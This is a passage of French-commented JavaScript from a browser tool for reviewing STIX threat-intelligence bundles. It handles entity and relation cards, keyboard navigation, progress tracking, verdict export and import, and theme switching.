  const i = ANCHOR.get(itemId + '|' + qi + '|' + oi);
  const el = i != null && document.getElementById('anc-' + i);
  if (!el) return;
  // Surligne les segments de cette occurrence précise.
  const k = String(i);
  document.querySelectorAll('.article mark.am').forEach(m => m.classList.toggle('hot', m.dataset.k.split(' ').includes(k)));
  el.scrollIntoView({block:'center'});
  showPanel([itemId]);
}

function focusItems(ids, label){
  const first = ITEMS.get(ids[0]); if (!first) return;
  const tab = first.kind === 'relation' ? 'relations' : first.kind === 'rejected' ? 'rejected' : 'entities';
  state.only = ids; state.onlyLabel = label || (ids.length === 1 ? (first.kind === 'relation' ? nameOf(first.source_ref) + ' → ' + nameOf(first.target_ref) : nameOf(first.id)) : ids.length + ' objets');
  setTab(tab);
  const card = byId(ids[0]); if (card){ setCur(card); card.classList.add('flash'); }
}
function renderTab(){
  const t = state.tab;
  if (t === 'relations') $('main').innerHTML = renderRelations();
  else if (t === 'entities') $('main').innerHTML = renderEntities();
  else if (t === 'rejected') $('main').innerHTML = renderRejected();
  else if (t === 'matrix') renderMatrix();
  else if (t === 'article') renderArticle();
  autosize();
}
function autosize(){ document.querySelectorAll('.vcomment').forEach(t => { t.style.height = 'auto'; t.style.height = Math.max(34, t.scrollHeight + 2) + 'px'; }); }

/* ---------- En-tête : titre, statistiques, progression ---------- */
function renderHeader(){
  const m = D.meta;
  $('r-title').innerHTML = m.url ? `<a href="${esc(m.url)}" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:none">${esc(m.report_name)} ↗</a>` : esc(m.report_name);
  $('r-files').textContent = `${m.bundle_file} · ${m.article_file} · ATT&CK ${m.attack_version || 'non chargé'}${m.declared_attack_version ? ' (déclaré : ' + m.declared_attack_version + ')' : ''} · généré le ${m.generated}`;
  const all = [...D.entities, ...REL];
  const cnt = lvl => all.reduce((n, it) => n + (it.flags.some(f => f.level === lvl) ? 1 : 0), 0);
  const req = REL.filter(r => r.label === 'gold:required').length, acc = REL.filter(r => r.label === 'gold:acceptable').length;
  $('stats').innerHTML = `<span class="stat"><b>${D.entities.length}</b> entités</span><span class="stat"><b>${REL.length}</b> relations</span><span class="stat"><b>${req}</b> required</span><span class="stat"><b>${acc}</b> acceptable</span>
    <button type="button" class="stat s-error" data-act="alerts" title="Objets avec au moins une erreur"><b>${cnt('error')}</b> en erreur</button>
    <button type="button" class="stat s-warn" data-act="alerts" title="Objets avec au moins un avertissement"><b>${cnt('warn')}</b> avec avertissement</button>`;
  $('reviewer').value = S.reviewer || '';
  renderProgress();
}
function renderProgress(){
  const ids = [...ITEMS.keys()], tot = ids.length;
  const c = {ok:0, fix:0, ko:0}; ids.forEach(id => { const v = verdictOf(id); if (c[v] != null) c[v]++; });
  const done = c.ok + c.fix + c.ko;
  $('bar').innerHTML = ['ok','fix','ko'].map(k => `<span class="p-${k}" style="width:${tot ? c[k]/tot*100 : 0}%"></span>`).join('');
  $('progress-txt').textContent = `${done}/${tot} revus · ${c.ok} correct · ${c.fix} à corriger · ${c.ko} non justifiés`;
}

/* ---------- Navigation clavier ---------- */
function setCur(card){
  document.querySelectorAll('.card.cur').forEach(c => c.classList.remove('cur'));
  card.classList.add('cur'); card.focus({preventScroll:true}); card.scrollIntoView({block:'nearest'});
}
document.addEventListener('keydown', e => {
  const tg = e.target;
  if (tg.matches && tg.matches('input, textarea, select')){ if (e.key === 'Escape') tg.blur(); return; }
  if (e.ctrlKey || e.metaKey || e.altKey) return;
  const cards = [...document.querySelectorAll('#main .card')];
  if (!cards.length) return;
  let i = cards.indexOf(document.querySelector('#main .card.cur'));
  if (e.key === 'j' || e.key === 'k'){
    i = e.key === 'j' ? Math.min(cards.length - 1, i + 1) : Math.max(0, i - 1);
    setCur(cards[i]); e.preventDefault();
  } else if (['1','2','3'].includes(e.key) && i > -1){
    const it = ITEMS.get(cards[i].dataset.card);
    const k = Object.keys(it.kind === 'rejected' ? REJ_VERDICTS : VERDICTS)[+e.key - 1];
    if (k) setVerdict(it.id, k);
  } else if (e.key === 'c' && i > -1){
    const t = cards[i].querySelector('textarea'); if (t){ t.focus(); e.preventDefault(); }
  }
});

/* ---------- Événements ---------- */
document.addEventListener('click', e => {
  const tab = e.target.closest('[data-tab]'); if (tab){ clearOnly(); setTab(tab.dataset.tab); return; }
  const mk = e.target.closest('.article mark.am'); if (mk){ showPanel(mk.dataset.ids.split(' ')); return; }
  const b = e.target.closest('[data-act]'); if (!b) return;
  const act = b.dataset.act, card = b.closest('[data-card]');
  if (act === 'verdict') setVerdict(card.dataset.card, b.dataset.v);
  else if (act === 'occ' || act === 'more' || act === 'goto'){
    const box = b.closest('.quote'), item = ITEMS.get(box.dataset.item), qi = +box.dataset.q;
    let oi = +box.dataset.o, r = +box.dataset.r;
    if (act === 'goto'){ gotoAnchor(item.id, qi, oi); return; }
    if (act === 'occ') oi = Math.max(0, Math.min(item.quotes[qi].anchor.occurrences.length - 1, oi + +b.dataset.d));
    else r = r > CTX ? CTX : CTX_MORE;
    box.dataset.o = oi; box.dataset.r = r; box.innerHTML = quoteInner(item, qi, oi, r);
  }
  else if (act === 'focus') focusItems(b.dataset.ids.split(' '));
  else if (act === 'ent-rels'){ const id = b.dataset.id; focusItems(REL.filter(r => r.source_ref === id || r.target_ref === id).map(r => r.id), 'relations de ' + nameOf(id)); }
  else if (act === 'clear-only'){ clearOnly(); renderTab(); }
  else if (act === 'close-panel'){ $('panel').hidden = true; document.querySelectorAll('mark.am.hot').forEach(m => m.classList.remove('hot')); }
  else if (act === 'alerts'){ $('f-alerts').checked = true; F.alerts = true; clearOnly(); setTab(state.tab === 'entities' ? 'entities' : 'relations'); }
});
document.addEventListener('input', e => {
  if (e.target.matches('.vcomment')){
    const id = e.target.closest('[data-card]').dataset.card, item = ITEMS.get(id);
    const cur = S.verdicts[id] || {}; cur.c = e.target.value; cur.t = new Date().toISOString(); if (!cur.fp) cur.fp = item.fp;
    S.verdicts[id] = cur; save();
    e.target.style.height = 'auto'; e.target.style.height = Math.max(34, e.target.scrollHeight + 2) + 'px';
  } else if (e.target.id === 'reviewer'){ S.reviewer = e.target.value; save(); }
});

/* ---------- Export / import ---------- */
function describe(it){
  if (it.kind === 'relation') return {source: nameOf(it.source_ref), relationship_type: it.relationship_type, target: nameOf(it.target_ref), source_ref: it.source_ref, target_ref: it.target_ref};
  if (it.kind === 'rejected') return {candidat: it.candidat};
  return {type: it.type, name: it.name, ext_id: it.ext_id};
}
$('btn-export').addEventListener('click', () => {
  const rows = [];
  for (const it of ITEMS.values()){
    const v = S.verdicts[it.id];
    if (!v || (!v.v && !v.c)) continue;
    rows.push(Object.assign({id: it.id, kind: it.kind}, describe(it), {label: it.label || null, verdict: v.v || null, comment: v.c || '', at: v.t || null, stale: !!(v.fp && v.fp !== it.fp)}));
  }
  const c = {ok:0, fix:0, ko:0}; rows.forEach(r => { if (c[r.verdict] != null) c[r.verdict]++; });
  const out = {bundle_id: D.meta.key, bundle_file: D.meta.bundle_file, article_file: D.meta.article_file, reviewer: S.reviewer || null,
    exported_at: new Date().toISOString(), summary: Object.assign({total: ITEMS.size, pending: ITEMS.size - c.ok - c.fix - c.ko}, c), verdicts: rows};
  const blob = new Blob([JSON.stringify(out, null, 2)], {type: 'application/json'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob); a.download = D.meta.bundle_stem + '.review.json';
  document.body.appendChild(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(a.href), 1000);
});
$('file-import').addEventListener('change', async e => {
  const f = e.target.files[0]; if (!f) return;
  try {
    const data = JSON.parse(await f.text());
    let n = 0;
    for (const r of data.verdicts || []){
      if (!ITEMS.has(r.id)) continue;
      S.verdicts[r.id] = {v: r.verdict || undefined, c: r.comment || '', t: r.at || null, fp: r.stale ? null : ITEMS.get(r.id).fp}; n++;
    }
    if (data.reviewer && !S.reviewer) S.reviewer = data.reviewer;
    save(); renderHeader(); renderTab();
    alert(n + ' verdict(s) importé(s).');
  } catch (err){ alert('Fichier illisible : ' + err.message); }
  e.target.value = '';
});

/* ---------- Thème ---------- */
const THEMES = ['auto', 'light', 'dark'];
let theme = 'auto';
try { theme = localStorage.getItem('stix-review:theme') || 'auto'; } catch (e) {}
function applyTheme(){ if (theme === 'auto') document.documentElement.removeAttribute('data-theme'); else document.documentElement.setAttribute('data-theme', theme); $('btn-theme').title = 'Thème : ' + theme; }
$('btn-theme').addEventListener('click', () => { theme = THEMES[(THEMES.indexOf(theme) + 1) % 3]; try { localStorage.setItem('stix-review:theme', theme); } catch (e) {} applyTheme(); });

/* ---------- Démarrage ---------- */
function measure(){ document.documentElement.style.setProperty('--hdr', $('top').offsetHeight + 'px'); }
window.addEventListener('resize', measure);
const initial = location.hash.slice(1);
applyTheme(); renderHeader(); renderTabs(); setupFilters(); setTab(TABS.some(t => t[0] === initial) ? initial : 'relations'); measure();
})();
</script>
